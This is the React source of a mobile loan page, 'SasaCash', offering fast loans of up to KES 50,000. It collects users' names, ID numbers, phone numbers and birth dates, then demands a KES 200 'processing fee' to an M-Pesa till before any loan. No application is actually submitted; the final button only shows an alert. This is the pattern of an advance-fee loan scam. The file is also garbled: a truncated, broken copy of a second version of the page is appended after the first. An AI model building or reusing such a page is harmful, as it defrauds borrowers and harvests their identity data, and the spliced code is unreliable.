"use client";
import { useState } from "react";

export default function Home() {
  const [showForm, setShowForm] = useState(false);
  const [step, setStep] = useState(1);

  const [form, setForm] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    id: "",
    phone: "",
    dob: "",
    maritalStatus: "",
    employmentStatus: "",
    amount: "",
    months: "",
    purpose: "",
  });

  const interestRate = 0.15;

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const loanAmount = Number(form.amount) || 0;
  const interest = loanAmount * interestRate;
  const total = loanAmount + interest;

  // 🟢 HOMEPAGE
  if (!showForm) {
    return (
      <div style={{
        maxWidth: "420px",
        margin: "auto",
        padding: "20px",
        fontFamily: "system-ui",
        backgroundColor: "#0f172a",
        color: "white",
        minHeight: "100vh"
      }}>

        <img src="/logo.png" style={{ width: "100px", marginBottom: "20px" }} />

        <div style={{
          background: "linear-gradient(135deg, #16a34a, #22c55e)",
          padding: "20px",
          borderRadius: "20px",
          boxShadow: "0 10px 25px rgba(0,0,0,0.3)"
        }}>
          <h2>Get up to KES 50,000</h2>
          <p>Fast loans with 15% interest. No paperwork.</p>

          <button
            onClick={() => setShowForm(true)}
            style={{
              marginTop: "15px",
              padding: "14px",
              width: "100%",
              borderRadius: "12px",
              border: "none",
              background: "white",
              fontWeight: "bold",
              fontSize: "16px"
            }}
          >
            Apply Now →
          </button>
        </div>

        <h3 style={{ marginTop: "25px" }}>Why SasaCash?</h3>

        <div style={featureBox}>⚡ Instant Processing<br /><small>Quick approval</small></div>
        <div style={featureBox}>🔒 Secure & Private<br /><small>Your data is safe</small></div>
        <div style={featureBox}>✅ Easy Process<br /><small>Simple steps</small></div>

      </div>
    );
  }

  // 🟢 FORM
  return (
    <div style={{
      maxWidth: "420px",
      margin: "auto",
      padding: "20px",
      fontFamily: "system-ui",
      backgroundColor: "#f8fafc",
      minHeight: "100vh"
    }}>

      <h2>Loan Application</h2>

      {/* STEP 1 */}
      {step === 1 && (
        <>
          <input placeholder="First Name *" name="firstName" onChange={handleChange} style={input} />
          <input placeholder="Middle Name" name="middleName" onChange={handleChange} style={input} />
          <input placeholder="Last Name *" name="lastName" onChange={handleChange} style={input} />
          <input placeholder="ID Number *" name="id" onChange={handleChange} style={input} />
          <input placeholder="Phone Number *" name="phone" onChange={handleChange} style={input} />
          <input type="date" name="dob" onChange={handleChange} style={input} />

          <select name="maritalStatus" onChange={handleChange} style={input}>
            <option>Marital Status *</option>
            <option>Single</option>
            <option>Married</option>
            <option>Divorced</option>
            <option>Widowed</option>
          </select>

          <select name="employmentStatus" onChange={handleChange} style={input}>
            <option>Employment Status *</option>
            <option>Employed</option>
            <option>Self Employed</option>
            <option>Business</option>
            <option>Student</option>
            <option>Other</option>
          </select>

          <button style={btn} onClick={() => setStep(2)}>Next</button>
        </>
      )}

      {/* STEP 2 */}
      {step === 2 && (
        <>
          <input type="number" placeholder="KES 1,000 - 50,000" name="amount" onChange={handleChange} style={input} />
          <input type="number" placeholder="Repayment (1-12 months)" name="months" onChange={handleChange} style={input} />

          <select name="purpose" onChange={handleChange} style={input}>
            <option>Loan Purpose *</option>
            <option>Business</option>
            <option>Personal</option>
            <option>Medical</option>
            <option>Emergency</option>
            <option>Other</option>
          </select>

          <button style={backBtn} onClick={() => setStep(1)}>Back</button>
          <button style={btn} onClick={() => setStep(3)}>Next</button>
        </>
      )}

      {/* STEP 3 */}
      {step === 3 && (
        <>
          <div style={reviewBox}>
            <p><b>Name:</b> {form.firstName} {form.lastName}</p>
            <p><b>Loan:</b> KES {loanAmount}</p>
            <p><b>Interest:</b> KES {interest}</p>
            <p><b>Total:</b> KES {total}</p>
          </div>

          <button style={backBtn} onClick={() => setStep(2)}>Back</button>
          <button style={btn} onClick={() => setStep(4)}>Proceed</button>
        </>
      )}

      {/* STEP 4 */}
      {step === 4 && (
        <>
          <h3>Processing Fee</h3>

          <p>Pay <b>KES 200</b> via M-Pesa</p>

          <p>1. Go to M-PESA</p>
          <p>2. Lipa Na M-PESA</p>
          <p>3. Buy Goods</p>
          <p>4. Till: <b>8808802</b></p>
          <p>5. Amount: 200</p>
          <p>6. Enter PIN</p>

          <p style={{ color: "red", fontWeight: "bold" }}>
            NOTE: You will receive your loan after payment.
          </p>

          <button style={btn} onClick={() => alert("Submitted!")}>
            Confirm Payment
          </button>
        </>
      )}
    </div>
  );
}

// 🎨 STYLES
const input = {
  width: "100%",
  padding: "14px",
  margin: "10px 0",
  borderRadius: "10px",
  border: "1px solid #ddd"
};

const btn = {
  width: "100%",
  padding: "14px",
  background: "#16a34a",
  color: "white",
  border: "none",
  borderRadius: "10px",
  marginTop: "10px",
  fontWeight: "bold"
};

const backBtn = {
  ...btn,
  background: "#9ca3af"
};

const featureBox = {
  background: "white",
  color: "black",
  padding: "15px",
  borderRadius: "12px",
  marginTop: "10px"
};

const reviewBox = {
  background: "white",
  padding: "15px",
  borderRadius: "12px",
  marginTop: "10px"
};ption>
          </select>

          <button style={styles.button} onClick={() => setStep(1)}>Back</button>
          <button style={styles.button} onClick={() => setStep(3)}>Next</button>
        </>
      )}

      {/* STEP 3 */}
      {step === 3 && (
        <>
          <h3>Review</h3>
          <p>Name: {form.firstName} {form.lastName}</p>
          <p>Loan: KES {loanAmount}</p>
          <p>Interest (15%): KES {interest}</p>
          <p>Total: KES {total}</p>

          <button style={styles.button} onClick={() => setStep(2)}>Back</button>
          <button style={styles.button} onClick={() => setStep(4)}>Proceed</button>
        </>
      )}

      {/* STEP 4 */}
      {step === 4 && (
        <>
          <h3>Processing Fee Payment</h3>

          <p>Pay a processing fee of <strong>KES 200</strong> to receive your loan.</p>

          <p>1. Go to M-PESA menu</p>
          <p>2. Select Lipa Na M-PESA</p>
          <p>3. Select Buy Goods and Services</p>
          <p>4. Enter Till Number <strong>8808802</strong></p>
          <p>5. Enter amount KES 200</p>
          <p>6. Enter M-PESA PIN and press OK</p>

          <p style={{ color: "red", fontWeight: "bold" }}>
            NOTE: You will receive your loan if you have paid the processing fee.
          </p>

          <button style={styles.button} onClick={() => alert("Application submitted!")}>
            Confirm Payment
          </button>
        </>
      )}
    </div>
  );
}

const styles = {
  container: {
    maxWidth: "400px",
    margin: "auto",
    padding: "20px",
    fontFamily: "Arial",
  },
  logo: {
    width: "120px",
    marginBottom: "20px",
  },
  card: {
    background: "#1f7a4c",
    color: "white",
    padding: "20px",
    borderRadius: "20px",
    marginBottom: "20px",
  },
  applyBtn: {
    marginTop: "15px",
    padding: "12px",
    background: "white",
    border: "none",
    borderRadius: "10px",
    cursor: "pointer",
  },
  feature: {
    background: "#f1f1f1",
    padding: "12px",
    margin: "10px 0",
    borderRadius: "10px",
  },
  input: {
    width: "100%",
    padding: "10px",
    margin: "10px 0",
  },
  button: {
    padding: "10px",
    margin: "5px",
    background: "green",
    color: "white",
    border: "none",
  },
};
